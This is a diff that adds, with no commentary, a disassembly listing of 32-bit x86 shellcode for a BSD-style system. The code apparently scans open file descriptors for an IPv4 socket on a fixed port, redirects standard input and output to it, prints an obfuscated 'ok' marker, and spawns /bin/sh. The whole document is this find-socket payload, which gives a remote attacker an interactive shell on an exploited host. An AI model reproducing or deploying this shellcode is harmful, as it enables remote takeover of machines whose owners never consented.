@@ -1,0 +1,49 @@
+0:  89 e2                   mov    edx,esp
+2:  83 ec 10                sub    esp,0x10
+5:  6a 10                   push   0x10
+7:  54                      push   esp
+8:  52                      push   edx
+9:  6a 00                   push   0x0
+b:  6a 00                   push   0x0
+d:  b8 1f 00 00 00          mov    eax,0x1f
+12: cd 80                   int    0x80
+14: 80 7a 01 02             cmp    BYTE PTR [edx+0x1],0x2
+18: 75 0b                   jne    0x25
+1a: 66 81 7a 02 42 41       cmp    WORD PTR [edx+0x2],0x4142
+20: 75 03                   jne    0x25
+22: eb 0f                   jmp    0x33
+24: 90                      nop
+25: ff 44 24 04             inc    DWORD PTR [esp+0x4]
+29: 81 7c 24 04 00 01 00    cmp    DWORD PTR [esp+0x4],0x100
+30: 00
+31: 75 da                   jne    0xd
+33: c7 44 24 08 00 00 00    mov    DWORD PTR [esp+0x8],0x0
+3a: 00
+3b: b8 5a 00 00 00          mov    eax,0x5a
+40: cd 80                   int    0x80
+42: ff 44 24 08             inc    DWORD PTR [esp+0x8]
+46: 83 7c 24 08 03          cmp    DWORD PTR [esp+0x8],0x3
+4b: 75 ee                   jne    0x3b
+4d: 68 0b 6f 6b 0b          push   0xb6b6f0b
+52: 81 34 24 01 00 00 01    xor    DWORD PTR [esp],0x1000001
+59: 89 e2                   mov    edx,esp
+5b: 6a 04                   push   0x4
+5d: 52                      push   edx
+5e: 6a 01                   push   0x1
+60: 6a 00                   push   0x0
+62: b8 04 00 00 00          mov    eax,0x4
+67: cd 80                   int    0x80
+69: 68 2f 73 68 00          push   0x68732f
+6e: 68 2f 62 69 6e          push   0x6e69622f
+73: 89 e2                   mov    edx,esp
+75: 31 c0                   xor    eax,eax
+77: 50                      push   eax
+78: 52                      push   edx
+79: 89 e1                   mov    ecx,esp
+7b: 50                      push   eax
+7c: 51                      push   ecx
+7d: 52                      push   edx
+7e: 50                      push   eax
+7f: b8 3b 00 00 00          mov    eax,0x3b
+84: cd 80                   int    0x80
+86: cc                      int3
